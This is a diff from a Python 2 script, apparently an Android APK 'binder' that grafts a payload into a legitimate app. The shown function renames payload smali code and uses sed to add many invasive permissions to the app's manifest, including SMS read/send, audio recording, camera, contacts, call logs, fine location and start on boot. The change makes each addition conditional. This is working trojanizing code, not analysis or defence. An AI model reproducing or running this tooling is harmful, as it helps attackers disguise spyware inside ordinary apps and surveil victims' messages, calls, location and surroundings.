@@ -82,31 +82,144 @@ def _binder():
         'sed -i "s#payload#' + rand7 + '#g" ' + meta1 + rand3 + '.smali',
         shell=True)
     print "I: Adding all permissions..."
-    subprocess.call(
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WAKE_LOCK"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_SMS"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.CAMERA"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_CONTACTS"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.CALL_PHONE"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.SEND_SMS"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\' ' + out1 + '/AndroidManifest.xml && '
-        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.INTERNET"/>\' ' + out1 + '/AndroidManifest.xml',
-        shell=True)
+    if '<uses-permission android:name="android.permission.INTERNET"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.INTERNET"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.SEND_SMS"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.SEND_SMS"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.RECEIVE_SMS"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.RECORD_AUDIO"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.CALL_PHONE"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.CALL_PHONE"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.READ_CONTACTS"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_CONTACTS"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.WRITE_CONTACTS"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.RECORD_AUDIO"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.WRITE_SETTINGS"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.CAMERA"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.CAMERA"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.READ_SMS"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_SMS"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.SET_WALLPAPER"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.READ_CALL_LOG"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
+    if '<uses-permission android:name="android.permission.WAKE_LOCK"/>' in open(out10).read():
+        pass
+    else:
+        subprocess.call(
+            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WAKE_LOCK"/>\' ' + out1 + '/AndroidManifest.xml',
+            shell=True)
     subprocess.call(
         "LIN=$(awk '/category.LAUNCHER/{ print NR - 3 }' " + out1 + "/AndroidManifest.xml) && sed -n \"$LIN\"p " + out1 + "/AndroidManifest.xml > " + tmp + "launch.txt",
         shell=True)
